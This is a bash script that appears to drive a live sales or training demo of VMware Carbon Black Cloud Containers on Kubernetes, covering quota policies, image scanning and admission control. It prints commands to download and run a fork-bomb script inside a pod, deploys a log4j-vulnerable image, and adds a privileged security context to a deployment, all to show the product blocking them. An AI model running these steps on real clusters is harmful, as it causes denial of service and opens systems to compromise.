#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
NC='\033[0m' # No Color

apt_check_and_install () {
   dpkg -s "$1" >/dev/null
   if [ $? -eq 1 ]
   then
      echo "Install $1"
      sudo apt-get install -y "$1"
   fi
}

# Install necessary Ubuntu packages
apt_check_and_install "pv"   # Used to simulate typing
apt_check_and_install "meld" # Used to show differences between good/bad YAML files
apt_check_and_install "git"  # Used to download netdemo

# Check that cbctl is present in the PATH
which cbctl >/dev/null
if [ $? -eq 1 ]
then
   echo -e "Please install ${RED}cbctl${NC} in your PATH"
   exit 1
fi

# if minikube exist, then define kubectl alias

if which minikube >/dev/null;
then
   shopt -s expand_aliases
   alias kubectl='minikube kubectl'
   intro="For this demo, we will use minikube."
fi

# if microk8s exist, then define kubectl alias
if which microk8s >/dev/null
then
   # Temporary fix for microk8s
   sudo rm -rf /run/containerd/containerd.sock
   sudo ln -s /var/snap/microk8s/common/run/containerd.sock /run/containerd/containerd.sock

   shopt -s expand_aliases
   alias kubectl='microk8s kubectl'
   intro="For this demo, we will use microK8s."
fi

####################################
###      include the magic       ###
####################################
source demo-magic.sh

# pe  : Print and Execute.
# pei : Print and Execute immediately.
# p   : Print only.
# w   : wait
# cmd : interactive mode

#####################################
###        PREPARE DEMO           ###
#####################################

clear
echo "---"
echo "Preparing demo..."

rm -f good.yaml bad.yaml >/dev/null 2>&1

kubectl delete deployment nodeapp >/dev/null 2>&1
kubectl delete service nodeapp-service >/dev/null 2>&1

kubectl delete pod log4j >/dev/null 2>&1
kubectl delete pod nginx >/dev/null 2>&1


kubectl delete ns netdemo >/dev/null 2>&1
kubectl delete service netdemo-service -n netdemo >/dev/null 2>&1
kubectl delete configmaps netdemo-configmap -n netdemo >/dev/null 2>&1
kubectl delete pod netdemo -n netdemo>/dev/null 2>&1

rm -rf cb_demos >/dev/null 2>&1

#####################################
###        DEMO INTRO             ###
#####################################

demo_intro() {
clear
echo "---"
echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect:"
echo -e " - K8s onprem"
echo -e " - K8s in public cloud, for example Amazon, Azure, or Google..."
echo -e " - minikube"
echo -e " - microK8s"

# Depending on your customer, you can enable the following lines
#echo -e " - OpenShift"
#echo -e " - Rancher"

echo -e " - and of course VMware Tanzu."

if test -z "$intro" 
then
      echo ""
else
      wait
      echo ""
      echo "${intro}"
fi
wait

clear
echo "---"
echo -e "Let's check that CBC is ${GREEN}running${NC} in this K8s cluster."
echo -e "How to check what pods are running in the K8s cluster?"
pe "kubectl get pods -A"
wait
echo -e ""
echo -e "---"
echo -e "CBC is running in it's own NAMESPACE ${GREEN}cbcontainers-dataplane${NC}."
wait
}

#####################################
###        DAEMONSET              ###
#####################################

demo_daemonset() {
clear
echo "---"
echo -e "VMware CBC is deployed in each K8s cluster."
echo -e "VMware CBC ${GREEN}node agent${NC} is deployed as a ${GREEN}daemonset${NC} in each K8s node."
echo "It means that in a K8s cluster with CBC, on each K8s node, a CBC agent will run."
echo "Daemonsets are commonly used for monitoring, networking and security solutions."
pe "kubectl get daemonsets -n cbcontainers-dataplane"
wait
}

#####################################
###         QUOTAS                ###
#####################################

demo_quota() {
clear
echo -e "---"
echo -e "We would like to deploy a ${GREEN}node.js${NC} application called ${GREEN}nodeapp${NC}."
echo -e "But before deploying it, we would like to apply a security policy."
echo -e "In CBC UI, create a policy to ${RED}BLOCK deployments with no CPU/mem quotas${NC}."
echo -e ""
echo -e "Why a ${RED}minimum${NC} quota?"
p "To be sure the pod will have enough CPU/mem to run correctly."
echo -e "Why a ${RED}maximum${NC} quota?"
p "To be sure the pod will not eat all CPU/mem, because of a bug or a cryptominer virus or someone playing Pacman..."
wait
clear
echo -e "---"
echo -e "We have prepared 2 deployment files, the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/good/deployment.yaml >/dev/null  2>&1
mv deployment.yaml good.yaml 2>/dev/null
wget https://raw.githubusercontent.com/slist/K8sConfigs/main/bad/deployment.yaml >/dev/null  2>&1
mv deployment.yaml bad.yaml 2>/dev/null
pe "ls *.yaml"
wait

clear
echo "---"
echo -e "Let's do a diff between the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
pe "meld good.yaml bad.yaml &"
wait

clear
echo "---"
echo -e "Let's try to deploy the ${RED}BAD${NC} deployment file."
pe "kubectl apply -f bad.yaml"

#Hack:
kubectl delete service nodeapp-service >/dev/null 2>&1

wait
echo ""
echo -e "Deployment of ${RED}BAD${NC} deployment file has failed."
echo "Check logs in K8s violations."
wait

clear
echo ""
echo -e "Now, Let's try to deploy the ${GREEN}GOOD${NC} deployment file."
pe "kubectl apply -f good.yaml"
wait

clear
echo "---"
echo "How to check if the app is running, and on which port is it listening?"
pe "kubectl get all"

wait
echo ""
echo "So, how to check if the app is running?"
pe "firefox http://127.0.0.1:30333 &"
wait

clear
echo "---"
echo -e "As a developer, how can I ${GREEN}validate${NC} my YAML file to deploy the image?"
echo -e "As a developer, I would like do it ${GREEN}manually${NC} or automate the validation in my ${GREEN}CICD pipeline${NC}."
echo -e "Let's validate the ${GREEN}GOOD${NC} deployment file"
pe "cbctl k8s-object validate -f good.yaml"

wait
echo "---"
echo -e "So, what was wrong with the ${RED}BAD${NC} deployment file?"
pe "cbctl k8s-object validate -f bad.yaml"
wait
}
#####################################
###          EXEC                 ###
#####################################

demo_exec() {
clear
echo "---"
echo "Let's list all pods:"
pe "kubectl get pods"

firstpod=$(kubectl get pods --no-headers | head -n1 | awk '{print $1;}')

wait
echo ""
echo -e "Let's open a shell in the pod, and try to download a malware"
echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
echo -e "${RED}chmod +x fork-bomb.sh${NC}"
echo -e "${RED}./fork-bomb.sh${NC}"
echo -e "It's a fork bomb, but luckily we have a ${GREEN}CPU quota${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"
wait

clear
echo "---"
echo -e "${GREEN}Check logs in K8s violations.${NC}"
echo "---"
echo -e "Modify CBC K8s to ${RED}BLOCK --- COMMAND / Exec to container---${NC}"
wait
echo ""
echo -e "Let's open a shell in the pod, and try to download a malware"
echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
echo -e "${RED}chmod +x fork-bomb.sh${NC}"
echo -e "${RED}./fork-bomb.sh${NC}"
pe "kubectl exec -it ${firstpod} -- /bin/bash"
wait
}

#####################################
###          LOG4J                ###
#####################################

demo_log4j() {
clear
echo "---"
echo -e "Modify CBC K8s to ${RED}BLOCK --- CONTAINER IMAGES / Critical vulnerabilities ---${NC}"
echo -e "Create an ${GREEN}exception${NC} if needed"
wait
echo -e ""
echo -e "---"
echo -e "Let's scan a container with the ${RED}log4j vulnerability${NC}"
pe "cbctl image scan tamirmich/log4j2-demo:0.0.3"
wait

echo ""
echo -e "In our ${GREEN}CICD pipeline${NC} we have integrated the automated vulnerability scan of all container images"
echo -e "Let's try to deploy the image containing the ${RED}log4j critical vulnerability${NC}"
pe "kubectl run log4j --image=tamirmich/log4j2-demo:0.0.3"
wait
}

#####################################
###          GO PACKAGE           ###
#####################################

demo_go() {
echo -e "---"
echo -e "Let's scan a container with ${GREEN}GO${NC} packages"
pe "cbctl image scan anchore/syft"
wait
}

#####################################
###          RUNTIME              ###
#####################################

demo_runtime() {
clear
#echo -e "---"
#echo -e "In CBC UI, ${GREEN}unblock${NC} deployments with no CPU/mem quotas."
#echo -e ""

#wait
echo -e "---"
echo -e "In our K8s clusters, we can monitor/alert on ${RED}runtime network malicious activities${NC} such as:"
echo " - Malicious IPs/URLs"
echo " - Port scan"
echo " - Baseline behavior"
echo -e "Let's deploy an image to simulate ${RED}malicious network activities${NC}"

pei "git clone https://github.com/0pens0/cb_demos.git"
pei "cd cb_demos/netdemo/"
pei "kubectl create namespace netdemo"
pei "kubectl create -f deploy/k8s_deployment_good_config.yml -n netdemo"
pei "kubectl create -f deploy/k8s_configmap_sql.yaml -n netdemo"
pei "kubectl create -f k8s_service.yaml -n netdemo"
pei "kubectl get services -n netdemo"

echo -e "---"
echo -e "Let's connect to the ${RED}malicious${NC} demo pod"
port=$(kubectl get services -n netdemo --no-headers | sed "s/.*://" | cut -f1 -d"/")
pe "firefox http://127.0.0.1:${port}"
wait
}

#####################################
###        ENFORCE                ###
#####################################

demo_enforce() {
clear

# Cleanup enforce demo
rm -rf nginx.yaml temp.yaml
kubectl delete deployments.apps nginx >/dev/null 2>&1


echo "---"
echo -e "Check that CB mutating hook is ready"
pe "kubectl get mutatingwebhookconfigurations.admissionregistration.k8s.io"

echo "---"
echo -e "Let's create a new ${RED}unsecure${NC} deployment file."

echo -e "First we will create a nginx deployment."
pe "kubectl create deployment nginx --image=nginx --dry-run=client -o yaml > temp.yaml"

echo -e "Remove status line"
pei "grep -v status temp.yaml |grep -v null >nginx.yaml"

#echo -e "Now will add ${RED}privileges${NC} to this deployment"
echo -e "Now will allow ${RED}privilege escalation${NC}"
echo -e "Add privileged security context"
pei "echo \"        securityContext:\" >> nginx.yaml"
pei "echo \"          privileged: true\" >> nginx.yaml"

echo ""
echo "---"
cat nginx.yaml
wait

echo ""
echo "---"
echo -e "Now will deploy this ${RED}unsecure${NC} deployment file."
pe "kubectl apply -f nginx.yaml"
wait

echo -e "What is the deployment in production now ?"
pe "kubectl get deployments nginx --output=yaml"

}

demo_end() {
echo ""
echo ""
echo -e "${GREEN}THANK YOU!${NC}"
echo ""
echo ""
}

#####################################
###           MAIN                ###
#####################################

demo_intro
demo_daemonset

demo_runtime
demo_log4j

# Use this demo for DEV/SEC/OPS only
#demo_quota
#demo_exec
#demo_go
demo_enforce

demo_end

exit 0
